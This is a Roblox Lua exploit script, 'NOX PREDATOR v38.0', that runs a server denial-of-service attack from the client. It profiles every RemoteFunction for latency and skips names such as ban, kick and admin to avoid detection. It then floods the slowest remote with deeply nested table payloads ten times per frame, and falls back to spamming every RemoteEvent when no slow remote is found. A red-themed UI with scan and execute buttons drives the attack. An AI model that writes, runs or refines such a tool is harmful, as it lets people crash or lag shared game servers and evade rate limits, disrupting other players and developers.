--[[
    🔱 NOX HUB v38.0 [PREDATOR-DRONE] 🔱
    "Don't attack the shield. Attack the crack."
    
    PREDATOR FEATURES:
    - [LATENCY PROFILING] : Measures response time of every RemoteFunction.
    - [WEAKNESS DETECTION] : Auto-selects the SLOWEST remote (heaviest logic).
    - [SURGICAL STRIKE] : Focuses 100% of packets on the single vulnerability.
    - [EFFICIENCY] : Bypasses general rate limits by abusing one expensive logic path.
]]

-- // CORE SERVICES //
local Players = game:GetService("Players")
local RunService = game:GetService("RunService")
local CoreGui = game:GetService("CoreGui")
local UserInputService = game:GetService("UserInputService")
local LocalPlayer = Players.LocalPlayer

-- // 1. PREDATOR ENGINE //
local Engine = {
    Active = false,
    Targets = {},
    BestTarget = nil,
    Buffer = {} 
}

function Engine:Log(msg)
    warn("[NOX PREDATOR]: " .. tostring(msg))
end

function Engine:ScanAndProbe(updateCallback)
    Engine.Log("Scanning frequency...")
    updateCallback(0, "SCANNING REMOTES...")
    
    local candidates = {}
    
    -- 1. IDENTIFY CANDIDATES
    for _, v in pairs(game:GetDescendants()) do
        if v:IsA("RemoteFunction") then
            local n = v.Name:lower()
            if not (n:find("ban") or n:find("kick") or n:find("admin") or 
                    n:find("market") or n:find("purchase") or n:find("shop") or 
                    n:find("product") or n:find("asset") or n:find("prompt") or
                    n:find("devtools") or n:find("console") or n:find("debug") or
                    n:find("warn") or n:find("error") or n:find("report")) then
                 table.insert(candidates, v)
            end
        end
    end
    
    updateCallback(0, "PROBING " .. #candidates .. " SIGNALS...")
    Engine.Log("Probing " .. #candidates .. " remotes...")
    
    -- 2. LATENCY PROFILING
    local worstLag = 0
    local worstRemote = nil
    
    for i, remote in ipairs(candidates) do
        updateCallback(0, "PROBING ["..i.."/"..#candidates.."]: " .. remote.Name)
        
        local start = tick()
        local success, err = pcall(function()
            -- We invoke with a simple valid arg to trigger logic
            return remote:InvokeServer("Ping")
        end)
        local duration = tick() - start
        
        if success then
            Engine.Log("Remote ["..remote.Name.."] Response: " .. string.format("%.4f", duration) .. "s")
            if duration > worstLag then
                worstLag = duration
                worstRemote = remote
            end
        else
            Engine.Log("Remote ["..remote.Name.."] Failed/Timed out.")
        end
        wait(0.1) -- Don't flood yet
    end
    
    Engine.BestTarget = worstRemote
    if worstRemote then
        Engine.Log("WEAKNESS FOUND: " .. worstRemote.Name .. " (" .. string.format("%.4f", worstLag) .. "s latency)")
        updateCallback(0, "LOCKED: " .. worstRemote.Name)
    else
        Engine.Log("No vulnerable RemoteFunctions found via Probe.")
    end
end

function Engine:Strike(duration, updateCallback)
    if Engine.Active then return end
    Engine.Active = true
    
    -- PHASE 1: PROBE
    if not Engine.BestTarget then
        Engine:ScanAndProbe(updateCallback)
    end
    
    -- FALLBACK: If no RemoteFunction is slow, or none exist, use shotgun mode on Events
    local TargetList = {}
    if Engine.BestTarget then
        TargetList = {Engine.BestTarget}
    else
        updateCallback(0, "NO WEAKNESS. ENGAGING SHOTGUN.")
        -- Fallback to events
        for _, v in pairs(game:GetDescendants()) do
            if v:IsA("RemoteEvent") then 
                local n = v.Name:lower()
                 if not (n:find("ban") or n:find("kick") or n:find("admin")) then
                    table.insert(TargetList, v)
                 end
            end
        end
    end
    
    if #TargetList == 0 then
        updateCallback(0, "NO TARGETS DETECTED.")
        Engine.Active = false
        return
    end
    
    -- ATTACK
    task.spawn(function()
        local StartTime = tick()
        local EndTime = StartTime + duration
        
        -- PAYLOAD: Recursivity (CPU) is usually best for "Heavy Logic" abuse.
        local Payload = {}
        local c = Payload
        for i=1,50 do c[1]={}; c=c[1] end
        
        local Connection
        Connection = RunService.Heartbeat:Connect(function()
            if not Engine.Active or tick() >= EndTime then
                Connection:Disconnect()
                return
            end
            
            -- FOCUSED FIRE
            -- We spam the ONE vulnerability.
            for i = 1, 10 do -- 10 shots per frame on the weak point
                for _, r in pairs(TargetList) do
                    pcall(function()
                        if r:IsA("RemoteFunction") then
                             task.spawn(function() r:InvokeServer(Payload) end)
                        else
                             r:FireServer(Payload)
                        end
                    end)
                end
            end
        end)
        
        while tick() < EndTime and Engine.Active do
            local remaining = math.ceil(EndTime - tick())
            local tName = Engine.BestTarget and Engine.BestTarget.Name or "ALL EVENTS"
            updateCallback(remaining, "FIRING AT: " .. tName)
            wait(1)
        end
        
        if Connection then Connection:Disconnect() end
        Engine.Active = false
        Engine.Log("Strike Complete.")
        updateCallback(duration, "SYSTEM READY")
    end)
end

-- // 2. COMMAND CENTER UI (Predator Theme) //
local Nox = {}

function Nox:CreateUI()
    for _, v in pairs(CoreGui:GetChildren()) do if v.Name:find("Nox") then v:Destroy() end end
    
    local Screen = Instance.new("ScreenGui")
    Screen.Name = "NoxCommand"
    pcall(function() Screen.Parent = CoreGui end)
    
    -- MAIN WINDOW
    local Main = Instance.new("Frame", Screen)
    Main.Size = UDim2.new(0, 500, 0, 350)
    Main.Position = UDim2.new(0.5, -250, 0.5, -175)
    Main.BackgroundColor3 = Color3.fromRGB(15, 5, 5) -- Black/Red
    Main.BorderSizePixel = 2
    Main.BorderColor3 = Color3.fromRGB(200, 0, 0)
    Main.ClipsDescendants = true
    
    local Corner = Instance.new("UICorner", Main)
    Corner.CornerRadius = UDim.new(0, 4)
    
    local TopBar = Instance.new("Frame", Main)
    TopBar.Size = UDim2.new(1, 0, 0, 40)
    TopBar.BackgroundColor3 = Color3.fromRGB(40, 0, 0)
    
    local Title = Instance.new("TextLabel", TopBar)
    Title.Text = "NOX PREDATOR v38.0"
    Title.Font = Enum.Font.SciFi
    Title.TextColor3 = Color3.fromRGB(255, 0, 0) 
    Title.TextSize = 18
    Title.Size = UDim2.new(0.5, 0, 1, 0)
    Title.Position = UDim2.new(0.05, 0, 0, 0)
    Title.TextXAlignment = Enum.TextXAlignment.Left
    Title.BackgroundTransparency = 1
    
    -- TABS
    local Tabs = Instance.new("Frame", Main)
    Tabs.Size = UDim2.new(0.25, 0, 0.85, 0) 
    Tabs.Position = UDim2.new(0, 0, 0.15, 0)
    Tabs.BackgroundColor3 = Color3.fromRGB(10, 0, 0)
    Tabs.BorderSizePixel = 0
    
    local function CreateTabBtn(text, order, callback)
        local btn = Instance.new("TextButton", Tabs)
        btn.Size = UDim2.new(1, 0, 0, 40)
        btn.Position = UDim2.new(0, 0, 0, (order-1)*40)
        btn.Text = text
        btn.TextColor3 = Color3.fromRGB(100, 50, 50)
        btn.BackgroundColor3 = Color3.fromRGB(15, 5, 5)
        btn.Font = Enum.Font.SciFi
        btn.BorderSizePixel = 0
        
        btn.MouseButton1Click:Connect(function()
            for _, c in pairs(Tabs:GetChildren()) do if c:IsA("TextButton") then c.TextColor3 = Color3.fromRGB(100, 50, 50) c.BackgroundColor3 = Color3.fromRGB(15, 5, 5) end end
            btn.TextColor3 = Color3.fromRGB(255, 0, 0) 
            btn.BackgroundColor3 = Color3.fromRGB(50, 0, 0)
            callback()
        end)
        return btn
    end
    
    -- CONTENT AREA
    local Content = Instance.new("Frame", Main)
    Content.Size = UDim2.new(0.75, 0, 0.85, 0)
    Content.Position = UDim2.new(0.25, 0, 0.15, 0)
    Content.BackgroundTransparency = 1
    
    -- PAGE 1: ATTACK
    local PageAttack = Instance.new("Frame", Content)
    PageAttack.Size = UDim2.new(1, 0, 1, 0)
    PageAttack.BackgroundTransparency = 1
    
    local StatusLbl = Instance.new("TextLabel", PageAttack)
    StatusLbl.Text = "AWAITING TARGET..."
    StatusLbl.Size = UDim2.new(1, 0, 0, 30)
    StatusLbl.Position = UDim2.new(0, 0, 0.1, 0)
    StatusLbl.TextColor3 = Color3.fromRGB(200, 0, 0)
    StatusLbl.Font = Enum.Font.SciFi
    StatusLbl.BackgroundTransparency = 1
    
    local TargetBack = Instance.new("Frame", PageAttack)
    TargetBack.Size = UDim2.new(0.8, 0, 0.1, 0)
    TargetBack.Position = UDim2.new(0.1, 0, 0.25, 0)
    TargetBack.BackgroundColor3 = Color3.fromRGB(30, 0, 0)
    TargetBack.BorderSizePixel = 1
    TargetBack.BorderColor3 = Color3.fromRGB(150, 0, 0)
    local TargetLbl = Instance.new("TextLabel", TargetBack)
    TargetLbl.Size = UDim2.new(1,0,1,0)
    TargetLbl.BackgroundTransparency = 1
    TargetLbl.Text = "NO TARGET LOCKED"
    TargetLbl.TextColor3 = Color3.fromRGB(255,100,100)
    TargetLbl.Font = Enum.Font.Code
    
    -- SCAN BUTTON
    local ScanBtn = Instance.new("TextButton", PageAttack)
    ScanBtn.Size = UDim2.new(0.35, 0, 0.2, 0)
    ScanBtn.Position = UDim2.new(0.1, 0, 0.6, 0)
    ScanBtn.BackgroundColor3 = Color3.fromRGB(60, 0, 0)
    ScanBtn.Text = "SCAN REMOTES"
    ScanBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
    ScanBtn.Font = Enum.Font.SciFi
    ScanBtn.TextSize = 14
    local SCorner = Instance.new("UICorner", ScanBtn) SCorner.CornerRadius = UDim.new(0,4)
    
    -- ATTACK BUTTON
    local MainBtn = Instance.new("TextButton", PageAttack)
    MainBtn.Size = UDim2.new(0.35, 0, 0.2, 0)
    MainBtn.Position = UDim2.new(0.55, 0, 0.6, 0)
    MainBtn.BackgroundColor3 = Color3.fromRGB(100, 0, 0)
    MainBtn.Text = "EXECUTE"
    MainBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
    MainBtn.Font = Enum.Font.SciFi
    MainBtn.TextSize = 14
    local MCorner = Instance.new("UICorner", MainBtn) MCorner.CornerRadius = UDim.new(0,4)
    
    ScanBtn.MouseButton1Click:Connect(function()
        if not Engine.Active then
            Engine:ScanAndProbe(function(_, txt)
                StatusLbl.Text = txt
                if Engine.BestTarget then
                    TargetLbl.Text = "LOCKED: " .. Engine.BestTarget.Name
                else
                     TargetLbl.Text = "SCAN COMPLETE (0 VULNERABILITIES)"
                end
            end)
        end
    end)
    
    MainBtn.MouseButton1Click:Connect(function()
        if not Engine.Active then
            Engine:Strike(15, function(timeLeft, txt)
                 StatusLbl.Text = txt
                 local progress = (15 - timeLeft) / 15
                 if timeLeft == 0 then MainBtn.Text = "EXECUTE" else MainBtn.Text = tostring(timeLeft) end
            end)
        end
    end)
    
    -- PAGE 2: VISUALS
    local PageVisuals = Instance.new("Frame", Content)
    PageVisuals.Size = UDim2.new(1, 0, 1, 0)
    PageVisuals.BackgroundTransparency = 1
    PageVisuals.Visible = false
    
    local Radar = Instance.new("Frame", PageVisuals)
    Radar.Size = UDim2.new(0.6, 0, 0.6, 0) -- Square aspect ratio roughly
    Radar.Position = UDim2.new(0.2, 0, 0.2, 0)
    Radar.BackgroundColor3 = Color3.fromRGB(10, 0, 0)
    Radar.BorderColor3 = Color3.fromRGB(200, 0, 0)
    Radar.BorderSizePixel = 2
    local RCorner = Instance.new("UICorner", Radar) RCorner.CornerRadius = UDim.new(1, 0)
    
    local ScanLine = Instance.new("Frame", Radar)
    ScanLine.Size = UDim2.new(0.5, 0, 0.02, 0)
    ScanLine.Position = UDim2.new(0.5, 0, 0.5, 0)
    ScanLine.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
    ScanLine.BackgroundTransparency = 0.5
    ScanLine.BorderSizePixel = 0
    
    task.spawn(function()
        local rot = 0
        while Radar.Parent do
            rot = rot + 5
            ScanLine.Rotation = rot
            wait(0.05)
        end
    end)

    -- TABS LOGIC
    CreateTabBtn("TARGET", 1, function() PageAttack.Visible = true; PageVisuals.Visible = false end)
    CreateTabBtn("RADAR", 2, function() PageAttack.Visible = false; PageVisuals.Visible = true end)
    
     -- DRAG UI
    local dragging, dragInput, dragStart, startPos
    Main.InputBegan:Connect(function(input)
        if input.UserInputType == Enum.UserInputType.MouseButton1 then
            dragging = true; dragStart = input.Position; startPos = Main.Position
        end
    end)
    UserInputService.InputChanged:Connect(function(input)
        if input.UserInputType == Enum.UserInputType.MouseMovement and dragging then
            local delta = input.Position - dragStart
            Main.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
        end
    end)
    UserInputService.InputEnded:Connect(function(input) if input.UserInputType == Enum.UserInputType.MouseButton1 then dragging = false end end)
    
    Engine:Log("Predator UI Initialized.")
end

Nox:CreateUI()
